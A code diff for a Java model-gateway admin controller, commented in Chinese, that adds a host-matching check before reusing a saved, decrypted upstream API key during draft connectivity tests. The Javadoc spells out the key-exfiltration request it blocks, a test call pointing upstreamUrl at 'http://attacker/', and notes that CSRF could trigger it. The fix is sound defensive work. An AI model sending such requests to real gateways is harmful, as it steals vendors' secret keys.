@@ -176,7 +176,7 @@ public class ModelController {
             // 地址、上游真实 ID 和参数配置仍全部使用 body 草稿，确保“测试”的就是眼前这份配置。
             Mono<ModelCredentialEntity> savedCredential = draft.requiresSavedCredential()
                     && modelId != null && !modelId.isBlank()
-                    ? Mono.fromCallable(() -> modelService.getCredentialDecrypted(modelId))
+                    ? Mono.fromCallable(() -> loadSavedCredentialForDraft(modelId, draft.getUpstreamUrl()))
                     : Mono.empty();
             return savedCredential
                     .subscribeOn(AdminScheduler.get())
@@ -202,6 +202,65 @@ public class ModelController {
                 .timeout(AdminScheduler.REQUEST_TIMEOUT)
                 .flatMap(mc -> connectivityService.probe(mc.model(), mc.credential()))
                 .map(Result::success);
+    }
+
+    /**
+     * 草稿模式下取已保存凭证，<b>但只在草稿上游主机与库中登记的一致时才给</b>。
+     *
+     * <p><b>不加这道校验就是一个密钥外传通道</b>：{@code hasDraftConfig()} 只要求
+     * {@code upstreamUrl} 非空，{@code requiresSavedCredential()} 在 {@code credential == null}
+     * 时返回 true——于是一个
+     * {@code POST /modelgate/models/test?modelId=<任一已存在模型>} 配
+     * {@code {"upstreamUrl":"http://attacker/"}} 的请求，就会让服务端把库中解密后的
+     * 上游厂商密钥写进请求头、POST 到调用方指定的地址，上游响应还回显给调用方。
+     * 它绕开了 {@code ModelVO} "secretKey 任何情况下都不下发" 那道防线，
+     * 且与网络隔离无关——管理员误操作或一次 CSRF 同样能触发。
+     *
+     * <p><b>只比主机，不比 scheme/端口/路径</b>：改协议、改端口、改接口路径都是正常的配置修正，
+     * 拦下来只会挡住真实用途；而外传必须把密钥送到<b>另一台主机</b>，主机一致就没有这条路。
+     * 能在上游自己那台机器上另起端口收包的人，早已在那台机器上有立足点，不是本校验的假想敌。
+     *
+     * <p><b>一律 fail-closed</b>：库里查不到该模型、任一地址为空、地址解析不出主机，
+     * 都当作"不一致"处理。
+     *
+     * <p>正常改地址的用法没有被堵死：在表单里重填 Secret Key 即可——
+     * 那时 {@code requiresSavedCredential()} 返回 false，根本不会走到这里。
+     */
+    private ModelCredentialEntity loadSavedCredentialForDraft(String modelId, String draftUpstreamUrl) {
+        ModelInstanceEntity stored = modelService.findByModelIdOrNull(modelId);
+        if (stored == null) {
+            // 库里没有这个模型，本就没有"已保存凭证"可复用；返回 null 让调用方按无凭证探测
+            return null;
+        }
+        if (!sameUpstreamHost(stored.getUpstreamUrl(), draftUpstreamUrl)) {
+            // 记 WARN 留痕：这既可能是正常改地址，也可能是一次外传尝试，两者都该在日志里看得见
+            log.warn("[Model][test] 草稿上游主机与库中不一致，拒绝复用已保存密钥: "
+                            + "modelId={}, 库中主机={}, 草稿主机={}",
+                    modelId, hostOf(stored.getUpstreamUrl()), hostOf(draftUpstreamUrl));
+            throw new BusinessException(ErrorCode.INVALID_PARAMETER,
+                    "草稿的上游地址与该模型库中登记的主机不一致，出于安全不会复用已保存的密钥。"
+                            + "请在表单里重新填写 Secret Key 后再测试。");
+        }
+        return modelService.getCredentialDecrypted(modelId);
+    }
+
+    /** 两个地址是否指向同一主机；任一取不出主机即判不一致（fail-closed）。 */
+    static boolean sameUpstreamHost(String storedUrl, String draftUrl) {
+        String a = hostOf(storedUrl);
+        return a != null && a.equals(hostOf(draftUrl));
+    }
+
+    /** 取 URL 的主机名并小写化；地址为空或非法一律返回 null，由调用方按"不一致"处理。 */
+    static String hostOf(String url) {
+        if (url == null || url.isBlank()) {
+            return null;
+        }
+        try {
+            String host = java.net.URI.create(url.trim()).getHost();
+            return host == null ? null : host.toLowerCase(java.util.Locale.ROOT);
+        } catch (Exception e) {
+            return null;
+        }
     }
 
     @Operation(summary = "对话测试（服务端用库中模型凭证直连上游，密钥不下发浏览器）")
